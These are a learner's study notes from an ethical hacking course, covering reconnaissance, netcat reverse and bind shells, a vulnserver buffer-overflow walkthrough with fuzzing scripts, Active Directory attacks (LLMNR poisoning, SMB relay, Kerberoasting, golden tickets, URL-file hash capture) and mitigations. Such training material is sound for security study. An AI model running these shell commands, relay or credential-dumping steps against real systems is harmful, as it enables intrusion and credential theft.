# TCM(Practical Ethical Hacking)

TCP vs UDP

layer 4 protocols, 

TCP(transport control protocol) reliable

UDP(User Datagram Protocol) faster

# Five stages of ethical hacking

1. Reconnaissance
2. Scanning & Enumeration(Nmap, Nessus, Nikto…)
3. Gaining access (exploitation)
4. maintainig access
5. covering tracks

### Information Gathering

- Target validation
- Finding Subdomains
- Fingerprinting
- Data Breaches

### discovering email addresses

*to find emails: use [https://phonebook.cz/](https://phonebook.cz/)

*to verify them use: emailhippo

*u can use Breach-parse tool ([https://github.com/hmaverickadams/breach-parse/blob/master/breach-parse.sh](https://github.com/hmaverickadams/breach-parse/blob/master/breach-parse.sh)) to find the appropriate credentials in a breach result.

u can also use deHashed to find breached credentials but it’s not free

### dicovering subdomaines

sublist3r and amass are great linux tools for this.

[crt.sh](http://crt.sh) is a website that does the same thing

if a long list of subdomains is given by these tools, use ‘tomnomnom httprobe’ and it will help verifying active ones.

Wappalyzer is a tool used to identify website technologies(cms:content management system)

there is also a tool in kali called ‘whatweb’ used to identify website technologies

# Scanning and Enumerating

[https://www.vulnhub.com/](https://www.vulnhub.com/) is where u can find vulnerable machines to attack.

# Enumerating HTTP & HTTPS

use Nmap to see if port 80 is open

use Dirbuster to find all directories and subdomains of any specific web app

# Enumerating SMB via port 139

SMB is a file share:

Metasploit is an open source pentesting framework used to identify and exploit vulnerabilities

smbclient is a tool that can connect to the share file

# Researching potential vulnerabilities

we look for the findings we found using the previously mentioned tools

for example: apache mod_ssl<2.8.7 exploit in google and the website: exploit database will give you the code to use. But it might not work, so u need to use a github exploit instead.

if u couldn’t search on internet, u can use the local tool : searchsploit Samba 2 (for example)

# Scanning with Nessus

nessus tells us about the vulnerabilities that the target has.

it specifies the degree of severity of each vulnerability

for example it it told us that openSSL is out of date

## Exploitation

# Netcat

Netcat **Reverse** shell: Target connecting to attacker, and all u can do is listening to what the vectime does.

attacker: nc -nlvp 4444

victime: nc 192.168.57.139 -e /bin/bash

Netcat **bind** shell : Attacker connecting to target , we open a port on the machine and we connect to it. the vectime then can listen.

attacker: nc 192.168.57.139 4444

victime: nc .nlvp 4444 -e /bin/bash

popping a shell : connecting to a Target

# Payloads

A payload is what we run as exploit.(what we send to a victim to gain a shell on the victim’s machine.

Staged payloads: 

sends playload in stages. can be less stable. example: windows/meterpreter/reverse_tcp

Non-Staged playloads:

sends playload all at once. but large in size and won’t always work. example: windows/materpreter_reverse_tcp

Ps : if your payload doesn’t word, try to change the type of the payload.

## Exploitation:

- Gaining root with metasploit:
    
    use metasploit to run the appropriate exploit to the target after choosing the correct payloads
    
- Gaining root manually:
    
    in the info gathering step, we found out that our target is runnung an outdated version of mod_ssl, wich is vulnerablel to Open luck.
    
    we found the exploit at: https://github.com/heltonWernik/OpenLuck and followed the steps.
    
- Brute Force attacks:
    
    you can either use hydra or metasploit.
    
    - syntax for hydra: hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://10.5.5.74:22 -t 4 -V
    - in metasploit, just search for ssh. when it gives back a result, u have to set options(username, rhosts, pass_file) and run the exploit.

- Credential Stuffing:
    
    using breach-parse to find credentials(usernames, passwords) and throwing them to a website.
    
    we use foxy proxy to use burpsuite
    
    then we intercept the login request, we send it to intruder, then we choose the attack type and we specify our playloads and we start the attack.
    

Password spraying: trying one password for many users

[attacking first machine (Blue)](https://www.notion.so/attacking-first-machine-Blue-dfe491ec2f4c4ce7962dfba1d6444f8c?pvs=21)

**Warning: using manual exploitation( ex: an exploit from github) instead of metasploit may lead to target getting  taken down.**

[Attacking Dev (Linux)](https://www.notion.so/Attacking-Dev-Linux-17c7ccdbc3fc4822bb93b9b36d68dcd9?pvs=21)

Local file inclusion :allows us to expose files that are running on a server

[Attacking linux machine “academy”](https://www.notion.so/Attacking-linux-machine-academy-712f34087008481791b8d6995d28aaf0?pvs=21)

[attacking Butler](https://www.notion.so/attacking-Butler-4b1b1feb0d6846f3ad180afc55c41b44?pvs=21)

[attacking BlackPearl](https://www.notion.so/attacking-BlackPearl-d8b3f41196514ecbaa659e7ef8bfdca2?pvs=21)

# **Introduction to Exploit Development (Buffer Overflows):**

What’s Buffer Overflow?

the memory contains a lot of spaces, on of em is the stack, and the stack contains the Esp, the buffer, the EBP and the EIP

the buffer is where the information is written, 

![Untitled](TCM(Practical%20Ethical%20Hacking)%20f72888f391304b26b1ce1483baff2a2c/Untitled.png)

when the buffer is full, the information is completed in the EBP and the EIP, and when it arrives to the EIP we can get a shell back. that’s what we call a Buffer overflow attack. 

## steps to conduct a buffer oveflow attack:

Spiking: looking for vulnerable parts of the program

Fuzzing: sending charachters to a program to see if we can break it

Finding the offset: after breaking the program, we look for the offset

Overwriting the EIP: we use the offset to overwrite the EIP.

Finding Bad charachters

finding the right module

generating shellcode

root!

# Example of a buffer overflow attack:

- **Spiking:**

we turn off the windows defender and we run the vulnserver and immunity.

then from the kali machine we start a connection with ncat: nc -nv “target machine ip” 9999.

![Untitled](TCM(Practical%20Ethical%20Hacking)%20f72888f391304b26b1ce1483baff2a2c/Untitled%201.png)

what are we going to do is we are going to send commands over the connection to the target and see if the machine is vulnerable. 

![Untitled](TCM(Practical%20Ethical%20Hacking)%20f72888f391304b26b1ce1483baff2a2c/Untitled%202.png)

stats.spk is a file that contains the small script that will be sent. 

then we wait for the script to find a vulnerability. we dont find anything when we send stats.spk

but vulnserver crashes when we send trunk.spk that contains trunk command.

so we found a vulnerability and we arrived to the EIP and overwritten it. so we got something important.

- Fuzzing:

we have this script that we run to see where the fuzzing crashes :

```jsx
import sys, socket
from time import sleep
```

```jsx
buffer = "A" * 100
```

```jsx
while True:
try:
payload = "TRUN /.:/" + buffer
```

```
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('192.168.0.140',9999))
    print ("[+] Sending the payload...\\n" + str(len(buffer)))
    s.send((payload.encode()))
    s.close()
    sleep(1)
    buffer = buffer + "A"*100
except:
    print ("The fuzzing crashed at %s bytes" % str(len(buffer)))
    sys.exit()

```

then we watch the immunity debugger until the crash happens.

we found out that the crash happens at 3100 bytes in the buffer.

but we didn’t overwrite the EIP which is what we wany to control. so we need to know where the EIP is at.

- Finding the offset:

we set a code as follows : 

```jsx
#!/usr/bin/python
 
import sys, socket
 
offset ="Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9"
 

try:
	payload = "TRUN /.:/" + offset

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(('192.168.0.140',9999))
	s.send((payload.encode()))
	s.close()

except:
	print("error connecting to server")
	sys.exit()
```

when we send this, we wait for a second crash and wait for the EIP value to show, then we use it to find the offset. 

we use the command: 

/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000 -q **386F4337**

the last number is the offset. 

the output is 2003, which is the value that will help us take control of the EIP. which means that we need 2003 bytes before we get to the EIP.

- Overwriting the EIP:

we change the script above to this :

![Untitled](TCM(Practical%20Ethical%20Hacking)%20f72888f391304b26b1ce1483baff2a2c/Untitled%203.png)

then the EIP is overwritten and the actual value is 42424242 which is BBBB in ascii .

- Finding bad characters:

we execute this code :

![Untitled](TCM(Practical%20Ethical%20Hacking)%20f72888f391304b26b1ce1483baff2a2c/Untitled%204.png)

this tests every possible character and sees if any one of it corresponds to a command that can be executed, which we call a bad character.

we visualize the content of the ESP in hex and we see the following:

![Screenshot 2023-08-30 155111.png](TCM(Practical%20Ethical%20Hacking)%20f72888f391304b26b1ce1483baff2a2c/Screenshot_2023-08-30_155111.png)

the highlighted chars are the bad characters which should be noticed.

- Finding the right module:

this step has a lot of detailed techniques that i didn’t undesrtand, better go see the vid again

- generating shellcode and gaining root:

use this command to generate shell code to send.

![Untitled](TCM(Practical%20Ethical%20Hacking)%20f72888f391304b26b1ce1483baff2a2c/Untitled%205.png)

then we wait for the shell to be popped.

# Active Directory overview:

Active Directory (AD) is a centralized and hierarchical directory service and identity management system developed by Microsoft. It is commonly used in Windows-based networks to store and manage information about network resources, user accounts, computer accounts, and other network-related entities.

- physical AD components
    
    **Domain controlle**r: what controls everything, its a server with the AD DS server role installed that has specifically been promoted to a domain controller.
    
    **AD DS Data Store**: contains database files and processes that store  and manage directory information for users, services, and application. contains the Ntds.dit file which is very important.
    
- Logical AD components:
    
    **AD DS Schema**: like a rule book that defines every type of object that can be stored in the directory and enforces rules regarding object creation and configuration. 
    
    **Domains**: are used to group and manage objects in an organization.
    
    **Domain Trees**: a hierarchy of domains( a main domain and subdomains)
    
    **Forests**: a collection of one or more domain trees.
    
    **Organizational Units** : containers that contain users, groups and computers.
    

# Setting up domain controller, user machines and groups:

password of the spider and the punisher : password1

password for SQLService admin acc : MYpassword123#

stspn -a HYDRA-DC/SQLService.MARVEL.local:60111 MARVEL\SQLService

setspn -T MARVEL.local -Q */*

server ip: 10.5.0.19

we add our two computers to our domain controller.

# Attacking AD:

### LLMNR Poisoning:

it’s a man in the middle attack, where we use Responder tool to get the hash of the password entered by the user. then we use hashcat to uncrack the password.

```jsx
sudo responder -I eth0 -dwPv
```

when we get the hashes, we can either use john the ripper tool or hashcat, mostly we use hashcat.

the better the gpu the faster the pw cracking is.

cracking rig: a bunch of graphic cards which are used to crack passwords.

when using haschcat we have to know which module to use in order to find the password.for example: NTLM

![Untitled](TCM(Practical%20Ethical%20Hacking)%20f72888f391304b26b1ce1483baff2a2c/Untitled%206.png)

we provide the hash and a wordlist.

to avoid this attack, LLMNR should be disabled.

### SMB Relay attacks:

instead of cracking hashes, we can relay those hashes to specific machines and gain access.

to do this, SMD signing must be disabled or not enforced. (by default it is disabled on workstations but enabled on servers).

this is the attack

![Untitled](TCM(Practical%20Ethical%20Hacking)%20f72888f391304b26b1ce1483baff2a2c/Untitled%207.png)

this is what are we looking for: message signing enabled but not required.

step 1: we configure responder( SMB:off, HTTP:off)

step2: we run responder, sudo responder -I tun0 -dwp

step3: setup our relay 

![Untitled](TCM(Practical%20Ethical%20Hacking)%20f72888f391304b26b1ce1483baff2a2c/Untitled%208.png)

# Defense against SMB relay attacks:

![Untitled](TCM(Practical%20Ethical%20Hacking)%20f72888f391304b26b1ce1483baff2a2c/Untitled%209.png)

the best thing to do is to enable SMB signing on all devices.

## Gaining shell after getting the hashes:

1st: we can use a metasploit module called “psexec”.  but it gets picked up more often.

2nd: we can use psexec.py tool which doesn’t get picked up a lot.

![Untitled](TCM(Practical%20Ethical%20Hacking)%20f72888f391304b26b1ce1483baff2a2c/Untitled%2010.png)

we can also use hashes instead of password

if psexec gets stopped by the antivirus, use [wmiexec.py](http://wmiexec.py) od [smbexec.py](http://smbexec.py) 

# IPv6 Attacks:

same principle as man in the middle attack, because if the machine is using ipv4, no one is doing dns ipv6. then the attacker machine will pretend to be the dns server that will pass traffic to the domain controller. how will the attacker machine connect to the domain controller? when the the target reboots, it sends login credentials trough ipv6 then the attacker can connect to domain controller.

IPv6 DNS takeover:

we setup ntlmrelayx 

![Untitled](TCM(Practical%20Ethical%20Hacking)%20f72888f391304b26b1ce1483baff2a2c/Untitled%2011.png)

We use mitm6 tool, the command is “sudo mitm6 -d marvel.local ”

then ip addresses will be assigned to mac addresses and the attacker will be a the man in the middle for ipv6.

now for example if a machine is rebooted and a user logs in, a lootme file will be generated and gets filled with all the informations it can get from that connection.

when a user logs in, we get a new username and password we can use to login to attempt a DCSync  attack. 

this attack is making a hacker’s life so easy. in order to mitigate this attack, disactivating ipv6 isn’t the best practice.

instead:

1-

![Untitled](TCM(Practical%20Ethical%20Hacking)%20f72888f391304b26b1ce1483baff2a2c/Untitled%2012.png)

2- disable WPAD if its not in use.

3- enable LDAP signing and LDAP channel binding.

considering administrative users to the protected users group or marking them as account is sensitive and cannot be delegated. this will prevent them from any impersonation of that user via delegation.

## Passback attacks:

uses printers settings where LDAP is on and gives away credentials easily.

# STRATEGY:

![Untitled](TCM(Practical%20Ethical%20Hacking)%20f72888f391304b26b1ce1483baff2a2c/Untitled%2013.png)

# **Post-Compromise AD Enumeration:**

After compromising a machine and getting logged in as a normal user, now what?

we do enumeration to see if we got anything interesting.

there are several tools we can use to do such a thing. 

1**-ldapdomaindump:**

```jsx
ldapdomaindump ldaps://192.168.138.136 -u ‘MARVEL\fcastle’ -p Password1
```

the ip is for our domain controller. 

fcastle is the user we got the credentials of..

this command will throw to us alot of precious things.

2-**Bloodhound**

in order to work with bloodhound, we first need to start neo4j ( sudo neo4j console).

it will give us a server address and a remote interface link. the link will direct us to neo4j browser( login username and password are neo4j ).

now we start bloodhound, we log in. 

we need data that can be used by bloodhound and we are going to use injestors.

![Untitled](TCM(Practical%20Ethical%20Hacking)%20f72888f391304b26b1ce1483baff2a2c/Untitled%2014.png)

this outputs a lot of information, we have to import it to bloodhound. then using bloodhound features we can get graphical representations of users, computers, … so we can get a clear vision on our targets.

**3-Plumhound**

we have to keep bloodhound running because plumhound is going to use the information within bloodhound and analyze that.

we start plumhound with the command 

![Untitled](TCM(Practical%20Ethical%20Hacking)%20f72888f391304b26b1ce1483baff2a2c/Untitled%2015.png)

!! neo4j instead of neo4j!! because thats what i have chosen for password

then we execute the following command: 

![Untitled](TCM(Practical%20Ethical%20Hacking)%20f72888f391304b26b1ce1483baff2a2c/Untitled%2016.png)

it will create a lot of files, including index.html which contains what we need.

# Post-compromise attacks:

now that we have an account or got access into an account, what can we do?

### Pass the password attack:

 we got the username of fcastle in the previous step, we can use that pw to do lateral movement (get access to same level users). We use **crackmapexec** tool cas follows:

![Untitled](TCM(Practical%20Ethical%20Hacking)%20f72888f391304b26b1ce1483baff2a2c/Untitled%2017.png)

pwned! means that we can access that acc as a local admin. (this means that we can have access to spiderman and thepunisher as a local admin)

### Pass the hash:

same as pass the pw, but here we use the password’s hash if we couldn’t get the actual password.

here is the command:

![Untitled](TCM(Practical%20Ethical%20Hacking)%20f72888f391304b26b1ce1483baff2a2c/Untitled%2018.png)

### Using crackmapexec tool for the Pass attack:

`crackmapexec smb 192.168.138.0/24 -u fcastle -d MARVEL.local -p Password1`

this command will dump out the accounts that are in same network and if they where accessible with the same password.

lsass.exe is a windows system process. its responsible for handling security related functions. lsassy is a tool used to perform credentials dumping on windows. 

crackmapexec has a module called lsassy that can do the same thing. 

![Untitled](TCM(Practical%20Ethical%20Hacking)%20f72888f391304b26b1ce1483baff2a2c/Untitled%2019.png)

`cmedb`  is a command that helps throwing the database of earlier uses of **crackmapexec** tool.

### Dumping and Cracking hashes:

when we get access to an account we want to get the maximum info, passwords… from it. 

[secretsdump.py](http://secretsdump.py) is the perfect tool for this.  

![Untitled](TCM(Practical%20Ethical%20Hacking)%20f72888f391304b26b1ce1483baff2a2c/Untitled%2020.png)

this screenshot is not complete. it dumps all the SAM hashes. 

we can use the hashes instead of the pw in this tool.

to crack hashes, just use hachcat!

## Pass attack mitigations:

![Untitled](TCM(Practical%20Ethical%20Hacking)%20f72888f391304b26b1ce1483baff2a2c/Untitled%2021.png)

## Kerberoasting:

this is how a user gets access to a service:

![Untitled](TCM(Practical%20Ethical%20Hacking)%20f72888f391304b26b1ce1483baff2a2c/Untitled%2022.png)

what we care about here is step 4. we request TGS as long as we have a domain account.

the TGS contains the server’s account hash. 

for this, we have a tool called [GetUserSPNs.py](http://GetUserSPNs.py) that we can use as follows to get the hash.

![Untitled](TCM(Practical%20Ethical%20Hacking)%20f72888f391304b26b1ce1483baff2a2c/Untitled%2023.png)

Then we can crack this hash and get the password. 

**!!when an account has <never> in last logon, it might be a honeypot.!!**

# Kerberoasting metigation:

of course use strong passwords.

Service accounts shouldn’t have domain admin previliges

# Token impersonating:

tokens are temporary keys that allow you to access a system without credentials. 

Delegate token: created for logging into a machine or using a remote desktop.

impersonate: attaching a network drive or a logon script

we can use metasploit’s module named incognito after popping a shell.

![Untitled](TCM(Practical%20Ethical%20Hacking)%20f72888f391304b26b1ce1483baff2a2c/Untitled%2024.png)

we notice that fcastle is has a token because he’s logged in.

![Untitled](TCM(Practical%20Ethical%20Hacking)%20f72888f391304b26b1ce1483baff2a2c/Untitled%2025.png)

here we impersonated fcastle easily.

## Token impersonation mitigation

Limit user/group token creation permission. 

domain admins shouldn’t log into accounts that they don’t need to be. So they don’t get a login token. 

make a local admin restriction.

# URL file attack:

when we have access to a user machine, we create this file and put it in the share file. 

`[InternetShortcut]
URL=blah
WorkingDirectory=blah
IconFile=\\x.x.x.x\%USERNAME%.icon
IconIndex=1`

x.x.x.x is the attacker ip.

then we run responder and we wait for the user to navigate into the file, then we get the hashes dropped back to us.

## Summary strategy:

![Untitled](TCM(Practical%20Ethical%20Hacking)%20f72888f391304b26b1ce1483baff2a2c/Untitled%2026.png)

# we now own the domain, what now?

![Untitled](TCM(Practical%20Ethical%20Hacking)%20f72888f391304b26b1ce1483baff2a2c/Untitled%2027.png)

## Dumping the NTDS.dit:

NTDS.dit is a database where all AD data is stored. 

we know that we can use secretsdump tool to see the users hashes including the NTDS file and many more things. like this:

![Untitled](TCM(Practical%20Ethical%20Hacking)%20f72888f391304b26b1ce1483baff2a2c/Untitled%2028.png)

but if we add the extension

![Untitled](TCM(Practical%20Ethical%20Hacking)%20f72888f391304b26b1ce1483baff2a2c/Untitled%2029.png)

we only get the NTDS file.

![Untitled](TCM(Practical%20Ethical%20Hacking)%20f72888f391304b26b1ce1483baff2a2c/Untitled%2030.png)

## Golden ticket attacks:

when we compromise the krbtgt account (kerberos ticket grant ticket account that allows us to generate tickets) we own the domain.

we can request access to any resource or system on the domain.

use golden tickets to have complete access to every machine.

To do this attack, we are going to use mimikatz to get the krbtgt hash and SID.

then we use them to generate our golden ticket

![Untitled](TCM(Practical%20Ethical%20Hacking)%20f72888f391304b26b1ce1483baff2a2c/Untitled%2031.png)

to pop a shell we use the command : misc::cmd

then we execute the command : dir \\THEPUNISHER\c$

this will throw back all the files in the directory of thepunisher 

# Additional active directory attacks:

in worst case scenario, we use these attacks. because these attacks could take down the entire domaine. 

there are always vulnerabilities that get discovered.

most recent: Zerologon, PrintNightmare….

we don’t just come and run these attacks against the domain. because it might take it down. but we should always check if we have these vulns in the domain.

### Zerologon:

it’s a very dangerous attack because it changes the domain controller password to null. then we use secretsdump to throw informations stored in the domain controller.

# !! END OF AD SECTION !!

# Post exploitation :

## File transfer:

when we want to host a file in a server or navigate to it there are a lot of tools we can use. 

![Untitled](TCM(Practical%20Ethical%20Hacking)%20f72888f391304b26b1ce1483baff2a2c/Untitled%2032.png)

### Maintaining access :

when we get access to a machine and the user shuts down the machine we are going to lose access to our machine.

there are many ways to maintain access:

- as a penetration tester we often create a new user to a the local machine.

 

but there are more severe ways to maintain access such as:

- persistence scripts. this method is dangerous because the way it works is that it opens a port with no authentication needed.

scheduled tasks:

the way it works is that it runs a process once each 5 or 10 min( chosen by attacker)

![Untitled](TCM(Practical%20Ethical%20Hacking)%20f72888f391304b26b1ce1483baff2a2c/Untitled%2033.png)

## pivoting:

when we compromise a machine we get access to an ip address( the ip address of one of the interfaces).

but the machine has another interface that has another ip address that is not in the same network. so we can’t ping it.

here comes the pivoting to help the attacker use the second ip address to access the other network and access other machines.

**How are we going to pivot, what tools should we use?**

we cat the file /etc/proxychains4 , at the bottom we find 

socks4 127.0.0.1 9050

![Untitled](TCM(Practical%20Ethical%20Hacking)%20f72888f391304b26b1ce1483baff2a2c/Untitled%2034.png)

this command will help us connect to the machine and bind to port 9050 which means that we can connect to the other network.

after this we can run nmap using proxy chains.

we can also run attacks.

we can also use sshuttle tool:

![Untitled](TCM(Practical%20Ethical%20Hacking)%20f72888f391304b26b1ce1483baff2a2c/Untitled%2035.png)

what this help us with is the process of running different tools. 

in other words, after running this we can just type in nmap …. and it will run simply.

## CleanUp:

what this means is to leave the environment as it was before the pentest. here we’re speaking about configurations.

in a red team prespective remove traces like logs, executables, scripts, files, malware, rootkit.

# Web application enumeration:

## finding subdomains:

we can use assetfinder but it lists a lot of subdomains that are not interesting for us. we should everytime grep the subdomains that we want.

we can automate this:

`#!/bin/bash`

`url=$1`

`if [ ! -d "$url" ];then
mkdir $url
fi`

`if [ ! -d "/recon" ];then
mkdir $url/recon
fi`

`assetfinder $url >> $url/recon/subs.txt`

`cat $url/recon/subs.txt | grep $1 >> $url/recon/final.txt`

`rm $url/recon/subs.txt`

after finding these subdomains, some of them might not be working. that’s why we need to check the ones that are alive. 

we use Httprobe.

`cat final.txt | httprobe`

this command will go and check all the subdomains that are in the final.txt file and throw the ones that are alive.

Then, when we finally get the list of all the subdomains that are working, we can’t just sit and check every single one of them. we can use Gowitness that will go and screenshot the website page. 

## Find & exploit common web vulnerabilities:

### SQL-injection:

it’s a manipulation of user input to get back any possible information from the DB. We use sql commands as an input.

WE can find the commands that we can inject in this document [https://portswigger.net/web-security/sql-injection/cheat-sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

we can use Burpsuite along with sqlmap.

Sometimes, username and password are not the only injectable parameters in the application. 

in some cases, session cookies might be the parameter that is injectable in the GET request.

when we send requests using the repeater in burpsuite, we should pay attention to the content length that might change if the response isn’t right.